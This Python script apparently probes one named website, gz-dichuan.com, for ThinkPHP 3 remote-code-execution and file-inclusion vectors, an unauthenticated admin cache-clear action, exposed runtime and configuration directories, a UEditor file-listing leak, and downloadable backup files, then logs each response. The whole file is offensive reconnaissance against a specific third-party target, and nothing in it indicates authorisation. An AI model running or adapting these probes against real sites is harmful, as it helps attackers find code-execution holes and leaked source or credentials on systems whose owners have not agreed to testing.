#!/usr/bin/env python3
"""gz: deep - TP3 template include / cache poisoning / UEditor edge cases"""
import urllib.request, urllib.parse, re, http.cookiejar, base64, subprocess, sys

HOST = "http://gz-dichuan.com"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def fetch(url, data=None, timeout=15, headers=None):
    h = {**UA, "Content-Type": "application/x-www-form-urlencoded"}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.geturl(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, e.read()
    except Exception as ex:
        return 0, url, str(ex).encode()

# TP3 known RCE/inclusion vectors
print("=== TP3 deep probes ===")
probes = [
    # TP3.2 cache file inclusion (requires writing to Runtime cache first)
    ("/index.php?m=home&c=index&a=index&_p=0&_f=1", "tp3-pf"),
    # TP3 parse_str RCE (old)
    ("/index.php?m=home&c=index&a=index&filter=system", "tp3-filter"),
    # GreenCMS specific - search/page params
    ("/index.php?m=home&c=index&a=search&keyword=test", "search"),
    # TP3 route cache / config
    ("/index.php?m=admin&c=cache&a=clear", "cache-clear-auth"),
    # check Runtime dir exposure
    ("/Runtime/", "runtime-dir"),
    ("/Application/Runtime/", "app-runtime"),
    ("/Application/Common/Conf/", "conf-dir"),
    # UEditor listfile without auth (info leak)
    ("/Extend/Ueditor2/php/controller.php?action=listimage&start=0&size=50", "ueditor-listimg"),
    # check if index.php~ or .bak exist
    ("/index.php~", "index-bak"),
    ("/index.php.bak", "index-bak2"),
    ("/www.zip", "www-zip"),
]
for u, tag in probes:
    try:
        code, final, body = fetch(HOST + u)
        b = body.decode("utf-8", "ignore") if isinstance(body, bytes) else str(body)
        print("%s [%s]: %s size=%d" % (tag, u[:60], code, len(b)))
    except Exception as e:
        print("%s [%s]: ERR %s" % (tag, u[:60], e))
